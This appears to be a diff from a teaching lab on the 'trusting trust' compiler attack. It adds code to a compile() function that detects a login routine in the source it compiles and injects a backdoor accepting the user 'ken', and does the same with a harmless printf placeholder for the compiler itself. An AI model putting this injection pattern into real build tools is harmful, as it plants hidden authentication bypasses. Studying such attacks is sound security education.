@@ -16,9 +16,6 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
-
 
     /*****************************************************************
      * Step 1:
@@ -29,9 +26,6 @@ static void compile(char *program, char *outname) {
 
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
-
-     
-
     /*****************************************************************
      * Step 2:
      */
@@ -49,8 +43,24 @@ static void compile(char *program, char *outname) {
     static char compile_attack[] 
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
-
-
+    char *pos;
+    // write to either login or compile
+    if ((pos = strstr(program, login_sig))) {
+        int prefix_len = pos - program + strlen(login_sig);
+        fwrite(program, 1, prefix_len, fp);
+        fprintf(fp, "%s", login_attack);
+        fprintf(fp, "%s", pos + strlen(login_sig));
+    } 
+    else if ((pos = strstr(program, compile_sig))) {
+        int prefix_len = pos - program + strlen(compile_sig);
+        fwrite(program, 1, prefix_len, fp);
+        fprintf(fp, "%s", compile_attack);
+        fprintf(fp, "%s", pos + strlen(compile_sig));
+    }
+    else {
+        fprintf(fp, "%s", program);
+    }
+    fclose(fp);
     /************************************************************
      * don't modify the rest.
      */
